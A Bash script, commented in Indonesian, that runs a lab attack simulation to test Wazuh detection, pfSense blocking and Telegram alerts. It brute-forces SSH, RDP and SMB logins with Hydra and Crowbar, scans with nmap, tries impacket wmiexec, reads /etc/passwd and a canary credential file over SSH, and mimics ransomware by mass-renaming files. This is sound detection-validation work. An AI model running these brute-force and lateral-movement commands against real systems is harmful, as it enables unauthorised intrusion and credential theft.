#!/bin/bash
# ============================================================
# Usage    : bash run_simulation.sh [--mode MODE] [--target TARGET]
# ============================================================

# ─────────────────────────────────────────────
# KONFIGURASI — sesuaikan sebelum dijalankan
# ─────────────────────────────────────────────
TARGET_SSH="192.168.10.30"        # Linux Endpoint
TARGET_RDP="192.168.10.20"        # Windows Endpoint
TARGET_HONEYPOT="100.69.237.58"   # Honeypot
WORDLIST="/usr/share/wordlists/rockyou.txt"
WORDLIST_SMALL="/tmp/sentinel_wordlist.txt"
USERLIST="/tmp/sentinel_userlist.txt"
EVIDENCE_DIR="/tmp/sentinel_evidence/$(date +%Y%m%d_%H%M%S)"
LOG_FILE="$EVIDENCE_DIR/simulation.log"

# Warna output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# ─────────────────────────────────────────────
# FUNGSI UTILITAS
# ─────────────────────────────────────────────

banner() {
    echo -e "${BOLD}${BLUE}"
    echo "╔══════════════════════════════════════════════════╗"
    echo "║     PROJECT SENTINEL — Attack Simulation         ║"
    echo "╚══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

log() {
    local level=$1
    local msg=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "[$timestamp] $msg" | tee -a "$LOG_FILE"
}

info()    { echo -e "${CYAN}[INFO]${NC}  $1"; log "INFO" "$1"; }
success() { echo -e "${GREEN}[OK]${NC}    $1"; log "OK" "$1"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $1"; log "WARN" "$1"; }
error()   { echo -e "${RED}[ERROR]${NC} $1"; log "ERROR" "$1"; }
section() { echo -e "\n${BOLD}${YELLOW}━━━ $1 ━━━${NC}\n"; log "SECTION" "$1"; }

check_tool() {
    if command -v "$1" &>/dev/null; then
        success "$1 tersedia"
        return 0
    else
        error "$1 tidak ditemukan — install dengan: sudo apt install $1 -y"
        return 1
    fi
}

confirm() {
    echo -e "${YELLOW}$1${NC}"
    read -p "Lanjutkan? (y/n): " ans
    [[ "$ans" =~ ^[Yy]$ ]]
}

countdown() {
    local sec=$1
    local msg=$2
    for i in $(seq $sec -1 1); do
        echo -ne "\r${YELLOW}$msg dalam $i detik... (Ctrl+C untuk batal)${NC}  "
        sleep 1
    done
    echo ""
}

# ─────────────────────────────────────────────
# SETUP ENVIRONMENT
# ─────────────────────────────────────────────

setup() {
    section "Setup Environment"

    # Buat direktori evidence
    mkdir -p "$EVIDENCE_DIR"
    info "Evidence dir: $EVIDENCE_DIR"

    # Siapkan wordlist kecil (50 password umum)
    cat > "$WORDLIST_SMALL" << 'EOF'
123456
password
admin
root
qwerty
abc123
monkey
EOF

    success "Wordlist kecil dibuat: $(wc -l < $WORDLIST_SMALL) password"

    # Siapkan username list
    cat > "$USERLIST" << 'EOF'
root
admin
fyep-1
fyep-2
user
test
administrator
db_admin
backup
ubuntu
kali
EOF

    success "Userlist dibuat: $(wc -l < $USERLIST) username"

    # Pastikan rockyou.txt tersedia
    if [ ! -f "$WORDLIST" ]; then
        if [ -f "${WORDLIST}.gz" ]; then
            info "Mengekstrak rockyou.txt..."
            sudo gunzip "${WORDLIST}.gz"
            success "rockyou.txt siap"
        else
            warn "rockyou.txt tidak ditemukan, menggunakan wordlist kecil"
            WORDLIST="$WORDLIST_SMALL"
        fi
    fi
}

# ─────────────────────────────────────────────
# CEK TOOLS
# ─────────────────────────────────────────────

check_tools() {
    section "Verifikasi Tools"
    local all_ok=true

    check_tool "hydra"   || all_ok=false
    check_tool "nmap"    || all_ok=false
    check_tool "nc"      || all_ok=false

    # Opsional
    command -v crowbar &>/dev/null && success "crowbar tersedia" || warn "crowbar tidak ada (RDP brute force akan pakai hydra)"
    command -v msfconsole &>/dev/null && success "metasploit tersedia" || warn "metasploit tidak ada"

    $all_ok || { error "Tools wajib tidak lengkap. Install dulu sebelum lanjut."; exit 1; }
}

# ─────────────────────────────────────────────
# CEK KONEKTIVITAS
# ─────────────────────────────────────────────

check_connectivity() {
    section "Verifikasi Konektivitas ke Target"

    local targets=("$TARGET_SSH:SSH Linux" "$TARGET_RDP:RDP Windows" "$TARGET_HONEYPOT:Honeypot")

    for target in "${targets[@]}"; do
        local ip="${target%%:*}"
        local name="${target##*:}"
        if ping -c 1 -W 2 "$ip" &>/dev/null; then
            success "$name ($ip) — reachable"
        else
            error "$name ($ip) — UNREACHABLE"
            warn "Pastikan VM menyala dan Tailscale aktif"
        fi
    done

    # Port check
    echo ""
    info "Cek port target..."
    nc -zw 3 "$TARGET_SSH" 22 &>/dev/null && success "SSH port 22 — OPEN" || error "SSH port 22 — CLOSED"
    nc -zw 3 "$TARGET_RDP" 3389 &>/dev/null && success "RDP port 3389 — OPEN" || warn "RDP port 3389 — CLOSED (mungkin firewall)"
    nc -zw 3 "$TARGET_HONEYPOT" 22 &>/dev/null && success "Honeypot port 22 — OPEN" || warn "Honeypot port 22 — CLOSED"
}

# ─────────────────────────────────────────────
# SIMULASI 1: BRUTE FORCE SSH
# ─────────────────────────────────────────────

attack_ssh() {
    section "Simulasi 1 — Brute Force SSH (Linux Endpoint)"

    local target="$TARGET_SSH"
    local output="$EVIDENCE_DIR/hydra_ssh_result.txt"
    local intensity="${1:-light}"

    info "Target    : $target"
    info "Tool      : Hydra"
    info "Intensitas: $intensity"
    info "Username  : $(wc -l < $USERLIST) entries"

    case $intensity in
        light)
            info "Password  : wordlist kecil ($(wc -l < $WORDLIST_SMALL) entries)"
            local PASS_FILE="$WORDLIST_SMALL"
            local THREADS=4
            ;;
        full)
            info "Password  : rockyou.txt ($(wc -l < $WORDLIST) entries)"
            local PASS_FILE="$WORDLIST"
            local THREADS=8
            warn "Mode FULL akan memakan waktu lama dan menghasilkan banyak alert"
            ;;
        *)
            warn "Intensitas tidak dikenal, menggunakan light"
            local PASS_FILE="$WORDLIST_SMALL"
            local THREADS=4
            ;;
    esac

    echo ""
    warn "⚠️  Simulasi brute force SSH akan dimulai ke $target"
    warn "    Pastikan Wazuh Dashboard sudah terbuka untuk monitoring"
    countdown 5 "Memulai serangan"

    info "Menjalankan Hydra..."
    local start_time=$(date +%s)

    hydra -L "$USERLIST" \
          -P "$PASS_FILE" \
          -t "$THREADS" \
          -vV \
          -f \
          -o "$output" \
          "ssh://$target" 2>&1 | tee "$EVIDENCE_DIR/hydra_ssh_verbose.txt"

    local end_time=$(date +%s)
    local duration=$((end_time - start_time))

    echo ""
    success "Brute force SSH selesai dalam ${duration} detik"
    info "Hasil disimpan di: $output"

    # Tampilkan ringkasan
    if [ -f "$output" ]; then
        local found=$(grep -c "host:" "$output" 2>/dev/null || echo 0)
        info "Credential ditemukan: $found"
        [ "$found" -gt 0 ] && cat "$output"
    fi

    echo ""
    info "Cek Wazuh Dashboard untuk alert:"
    info "→ https://100.84.121.118 → Security Events → rule.groups: authentication_failures"
    info "→ Notifikasi Telegram harus muncul dalam < 30 detik"
}

# ─────────────────────────────────────────────
# SIMULASI 2: BRUTE FORCE RDP
# ─────────────────────────────────────────────

attack_rdp() {
    section "Simulasi 2 — Brute Force RDP (Windows Endpoint)"

    local target="$TARGET_RDP"
    local output="$EVIDENCE_DIR/bruteforce_rdp_result.txt"

    info "Target : $target"
    info "Port   : 3389 (RDP)"

    # Cek apakah crowbar tersedia
    if command -v crowbar &>/dev/null; then
        info "Tool   : Crowbar"
        warn "⚠️  Simulasi brute force RDP akan dimulai ke $target"
        countdown 5 "Memulai serangan RDP"

        crowbar -b rdp \
                -s "$target/32" \
                -U "$USERLIST" \
                -C "$WORDLIST_SMALL" \
                -v 2>&1 | tee "$output"

    else
        info "Tool   : Hydra (crowbar tidak tersedia)"
        warn "⚠️  Simulasi brute force RDP akan dimulai ke $target"
        countdown 5 "Memulai serangan RDP"

        hydra -L "$USERLIST" \
              -P "$WORDLIST_SMALL" \
              -t 1 \
              -vV \
              -o "$output" \
              "rdp://$target" 2>&1 | tee "$EVIDENCE_DIR/hydra_rdp_verbose.txt"
    fi

    success "Brute force RDP selesai"
    info "Hasil disimpan di: $output"
    info "Cek alert di Wazuh: rule.id: 18134 (Windows RDP brute force)"
}

# ─────────────────────────────────────────────
# SIMULASI 3: HONEYPOT TRIGGER
# ─────────────────────────────────────────────

attack_honeypot() {
    section "Simulasi 3 — Honeypot Trigger (Cowrie SSH)"

    local target="$TARGET_HONEYPOT"
    local output="$EVIDENCE_DIR/honeypot_trigger.txt"

    info "Target  : $target (Honeypot Cowrie)"
    info "Tujuan  : Trigger honeypot alert di Wazuh"

    warn "⚠️  Koneksi ke honeypot akan dimulai"
    countdown 3 "Memulai trigger honeypot"

    # SSH ke honeypot dengan berbagai credential
    local creds=("root:admin" "admin:password" "root:123456" "admin:admin123" "db_admin:DBAdmin2026")

    for cred in "${creds[@]}"; do
        local user="${cred%%:*}"
        local pass="${cred##*:}"
        info "Mencoba: $user / $pass"

        sshpass -p "$pass" ssh \
            -o StrictHostKeyChecking=no \
            -o ConnectTimeout=5 \
            -o UserKnownHostsFile=/dev/null \
            "$user@$target" \
            "whoami; id; ls /; cat /etc/passwd; exit" 2>/dev/null | \
            tee -a "$output"

        sleep 2
    done

    success "Honeypot trigger selesai"
    info "Cek alert di Wazuh: rule.groups: honeypot"
    info "Notifikasi Telegram harus muncul dalam < 15 detik"
}

# ─────────────────────────────────────────────
# SIMULASI 4: CANARY TOKEN ACCESS
# ─────────────────────────────────────────────

attack_canary() {
    section "Simulasi 4 — Canary Token Access"

    local output="$EVIDENCE_DIR/canary_trigger.txt"

    info "Target Linux  : /etc/db_passwords.conf di $TARGET_SSH"
    warn "⚠️  Akses canary token akan dimulai"
    countdown 3 "Memulai trigger canary"

    # Akses canary token Linux
    info "Mengakses canary token Linux..."
    ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=10 \
        -o UserKnownHostsFile=/dev/null \
        "fyep-1@$TARGET_SSH" \
        "cat /etc/db_passwords.conf" 2>/dev/null | tee "$output"

    success "Canary token Linux triggered"
    info "Alert harus muncul di Wazuh: rule.id: 100200"

    sleep 5

    # Canary Windows — instruksi manual
    warn "Untuk Windows canary token:"
    warn "→ Buka notepad 'C:\\Users\\fyep-2\\Documents\\credentials.xlsx' di Windows Endpoint"
    warn "→ Alert akan muncul via canary-monitor.py"
}

# ─────────────────────────────────────────────
# SIMULASI 5: NMAP RECONNAISSANCE
# ─────────────────────────────────────────────

attack_recon() {
    section "Simulasi 5 — Network Reconnaissance (Nmap)"

    local output="$EVIDENCE_DIR/nmap_recon.txt"

    info "Target  : 192.168.10.0/24 (VLAN10 Production)"
    warn "⚠️  Network scan akan dimulai"
    countdown 3 "Memulai reconnaissance"

    # Nmap scan
    nmap -sV \
         -p 22,80,443,3389,3306,5432,1514 \
         --open \
         -oN "$output" \
         192.168.10.0/24 2>&1 | tee "$EVIDENCE_DIR/nmap_verbose.txt"

    success "Nmap scan selesai"
    info "Hasil disimpan di: $output"
}


# ─────────────────────────────────────────────
# SIMULASI 6: LATERAL MOVEMENT (dari Kali)
# ─────────────────────────────────────────────

attack_lateral() {
    section "Simulasi 6 — Lateral Movement Attempt (SMB/WMI)"

    local output="$EVIDENCE_DIR/lateral_movement.txt"

    info "Target  : $TARGET_RDP (Windows Endpoint) via SMB"
    info "Tujuan  : Simulasi lateral movement pasca credential dump"
    info "MITRE   : T1550.002 — Pass-the-Hash, T1021.002 — SMB"

    warn "⚠️  Lateral movement attempt akan dimulai"
    countdown 3 "Memulai lateral movement"

    # Step 1 — SMB enumeration
    info "Step 1: SMB enumeration..."
    nmap -p 445,139 \
         --script smb-enum-shares,smb-enum-users \
         "$TARGET_RDP" 2>&1 | tee "$output"

    sleep 3

    # Step 2 — SMB brute force (simulasi Pass-the-Hash)
    info "Step 2: SMB authentication attempt..."
    hydra -L "$USERLIST" \
          -P "$WORDLIST_SMALL" \
          -t 1 \
          -vV \
          "smb://$TARGET_RDP" 2>&1 | tee -a "$output"

    sleep 3

    # Step 3 — WMI attempt via impacket (jika tersedia)
    if command -v impacket-wmiexec &>/dev/null; then
        info "Step 3: WMI execution attempt..."
        impacket-wmiexec "fyep-2:wrongpassword@$TARGET_RDP" \
            "whoami" 2>&1 | tee -a "$output" || true
    else
        warn "impacket tidak tersedia — skip WMI"
        warn "Install: sudo apt install python3-impacket -y"
    fi

    sleep 3

    # Step 4 — RPC/DCOM port scan
    info "Step 4: RPC port scan (T1021.003)..."
    nmap -p 135,593 "$TARGET_RDP" 2>&1 | tee -a "$output"

    echo ""
    success "Lateral movement simulation selesai"
    info "Cek Wazuh Dashboard:"
    info "→ rule.groups: authentication_failures (SMB auth failure)"
    info "→ Micro-segmentation pfSense harus memblokir traffic ini"
}

# ─────────────────────────────────────────────
# SIMULASI 7: RANSOMWARE TRIGGER dari Kali
# ─────────────────────────────────────────────

attack_ransomware_trigger() {
    section "Simulasi 7 — Ransomware Behavior Trigger (FIM)"

    local output="$EVIDENCE_DIR/ransomware_trigger.txt"

    info "Target  : $TARGET_SSH (Linux Endpoint)"
    info "Tujuan  : Trigger FIM alert dengan mass file creation/modification"
    info "MITRE   : T1486 — Data Encrypted for Impact"

    warn "⚠️  Mass file operation akan dimulai di Linux Endpoint"
    warn "    Ini akan trigger Wazuh FIM alert (>50 file dalam 1 menit)"
    countdown 3 "Memulai ransomware trigger"

    ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=10 \
        "fyep-1@$TARGET_SSH" bash << 'SSHEOF' 2>&1 | tee "$output"
mkdir -p /tmp/gtcorp_files/documents
mkdir -p /tmp/gtcorp_files/database
mkdir -p /tmp/gtcorp_files/backup
echo "[*] Membuat 60 file untuk trigger FIM threshold..."
for i in $(seq 1 20); do
    echo "CONFIDENTIAL DATA $i" > /tmp/gtcorp_files/documents/report_${i}.docx
    echo "DB_RECORD_$i" > /tmp/gtcorp_files/database/record_${i}.db
    echo "BACKUP_$i" > /tmp/gtcorp_files/backup/backup_${i}.bak
done
echo "[*] Total file: $(find /tmp/gtcorp_files -type f | wc -l)"
echo "[*] Simulasi enkripsi (rename ke .locked)..."
find /tmp/gtcorp_files -type f | while read f; do mv "$f" "${f}.locked"; done
echo "[*] File terenkripsi: $(find /tmp/gtcorp_files -name '*.locked' | wc -l)"
echo "[*] Ransomware simulation selesai"
SSHEOF

    echo ""
    success "Ransomware trigger selesai"
    info "Cek Wazuh Dashboard dalam < 5 menit:"
    info "→ FIM alert: banyak file berubah"
    info "→ Severity: CRITICAL jika >50 file berubah"

    sleep 30
    info "Cleanup file simulasi..."
    ssh -o StrictHostKeyChecking=no "fyep-1@$TARGET_SSH" \
        "rm -rf /tmp/gtcorp_files" 2>/dev/null
}

# ─────────────────────────────────────────────
# CLEANUP — Hapus IP dari blocklist pfSense
# ─────────────────────────────────────────────

cleanup() {
    section "Cleanup — Hapus IP dari Blocklist"

    local kali_ip=$(tailscale ip --4 2>/dev/null || hostname -I | awk '{print $1}')
    info "IP Kali Linux: $kali_ip"

    warn "Setelah simulasi, IP Kali mungkin diblokir di pfSense"
    warn "Hapus IP dari blocklist pfSense:"
    echo ""
    echo -e "${CYAN}  Di pfSense shell (opsi 8):${NC}"
    echo -e "${CYAN}  pfctl -t sshlockout -T delete $kali_ip${NC}"
    echo -e "${CYAN}  pfctl -t virusprot -T delete $kali_ip${NC}"
    echo ""

    info "Atau via pfSense GUI:"
    info "→ Diagnostics → Tables → sshlockout → hapus IP"
}

# ─────────────────────────────────────────────
# GENERATE EVIDENCE REPORT
# ─────────────────────────────────────────────

generate_report() {
    section "Generate Evidence Report"

    local report="$EVIDENCE_DIR/SIMULATION_REPORT.md"

    cat > "$report" << EOF
# Simulasi Serangan — Project Sentinel
**Tanggal:** $(date '+%Y-%m-%d %H:%M:%S WIB')
**Target:** Global-Tech Corp Lab Environment

## Target yang Diserang

| Target | IP | Port | Status |
|---|---|---|---|
| Linux Endpoint | $TARGET_SSH | 22 (SSH) | Diserang |
| Windows Endpoint | $TARGET_RDP | 3389 (RDP) | Diserang |
| Honeypot | $TARGET_HONEYPOT | 22 (SSH Cowrie) | Di-trigger |

## Tools yang Digunakan

- Hydra — SSH/RDP brute force
- Nmap — Network reconnaissance
- sshpass — Honeypot trigger
- Crowbar — RDP brute force (jika tersedia)

## File Evidence

$(ls -la $EVIDENCE_DIR/*.txt 2>/dev/null | awk '{print "- "$NF}')

## Expected Alerts di Wazuh

| Serangan | Rule ID | Severity | Response |
|---|---|---|---|
| SSH Brute Force | 5763 | HIGH | IP diblokir pfSense + Telegram |
| RDP Brute Force | 18134 | HIGH | IP diblokir pfSense + Telegram |
| Honeypot SSH | 100101 | CRITICAL | Telegram notifikasi |
| Canary Token Linux | 100200 | HIGH | Telegram notifikasi |

## Checklist Validasi

- [ ] Alert SSH brute force muncul di Wazuh < 60 detik
- [ ] Alert RDP brute force muncul di Wazuh < 60 detik
- [ ] IP Kali diblokir di pfSense < 30 detik
- [ ] Notifikasi Telegram diterima lengkap
- [ ] Honeypot alert muncul di Wazuh
- [ ] Canary token alert muncul di Wazuh
- [ ] Screenshot diambil dan diupload ke repo

## Catatan

Simulasi ini dilakukan dalam lingkungan lab terisolasi
untuk keperluan validasi sistem deteksi Project Sentinel.
Semua aktivitas dimonitor dan didokumentasikan.
EOF

    success "Report dibuat: $report"
    cat "$report"
}

# ─────────────────────────────────────────────
# MAIN — Parse argument dan jalankan mode
# ─────────────────────────────────────────────

show_help() {
    echo -e "${BOLD}Usage:${NC} bash run_simulation.sh [OPTIONS]"
    echo ""
    echo -e "${BOLD}Mode:${NC}"
    echo "  --mode ssh          Brute force SSH saja"
    echo "  --mode rdp          Brute force RDP saja"
    echo "  --mode honeypot     Trigger honeypot saja"
    echo "  --mode canary       Trigger canary token saja"
    echo "  --mode recon        Network reconnaissance saja"
    echo "  --mode all          Semua simulasi (default)"
    echo ""
    echo -e "${BOLD}Intensitas (untuk SSH/RDP):${NC}"
    echo "  --intensity light   Wordlist kecil, cepat (default)"
    echo "  --intensity full    rockyou.txt, lebih banyak percobaan"
    echo ""
    echo -e "${BOLD}Contoh:${NC}"
    echo "  bash run_simulation.sh --mode ssh --intensity light"
    echo "  bash run_simulation.sh --mode all"
    echo "  bash run_simulation.sh --mode honeypot"
}

main() {
    # Default values
    local MODE="all"
    local INTENSITY="light"

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            --mode)       MODE="$2"; shift 2 ;;
            --intensity)  INTENSITY="$2"; shift 2 ;;
            --help|-h)    show_help; exit 0 ;;
            *)            warn "Unknown argument: $1"; shift ;;
        esac
    done

    # Tampilkan banner
    banner

    # Konfirmasi awal
    echo -e "${RED}${BOLD}⚠️  PERINGATAN ⚠️${NC}"
    echo -e "${YELLOW}Script ini akan menjalankan simulasi serangan siber."
    echo -e "Pastikan hanya dijalankan di lingkungan lab terisolasi."
    echo -e "Target: $TARGET_SSH, $TARGET_RDP, $TARGET_HONEYPOT${NC}"
    echo ""

    confirm "Apakah kamu sudah koordinasi dengan tim dan siap memulai simulasi?" || {
        info "Simulasi dibatalkan."
        exit 0
    }

    # Setup environment
    setup
    check_tools
    check_connectivity

    echo ""
    info "Mode        : $MODE"
    info "Intensitas  : $INTENSITY"
    info "Evidence dir: $EVIDENCE_DIR"
    echo ""

    # Jalankan simulasi sesuai mode
    case $MODE in
        ssh)
            attack_ssh "$INTENSITY"
            ;;
        rdp)
            attack_rdp
            ;;
        honeypot)
            attack_honeypot
            ;;
        canary)
            attack_canary
            ;;
        recon)
            attack_recon
            ;;
        lateral)
            attack_lateral
            ;;
        ransomware)
            attack_ransomware_trigger
            ;;
        all)
            attack_recon
            sleep 10
            attack_ssh "$INTENSITY"
            sleep 10
            attack_rdp
            sleep 10
            attack_honeypot
            sleep 10
            attack_canary
            sleep 10
            attack_lateral
            sleep 10
            attack_ransomware_trigger
            ;;
        *)
            error "Mode tidak dikenal: $MODE"
            show_help
            exit 1
            ;;
    esac

    # Cleanup info dan report
    cleanup
    generate_report

    echo ""
    success "═══════════════════════════════════════════"
    success "Simulasi selesai!"
    success "Evidence tersimpan di: $EVIDENCE_DIR"
    success "Upload ke repo: /evidence/week3/{bruteforce,lateral-movement,ransomware}/"
    success "═══════════════════════════════════════════"
}

main "$@"
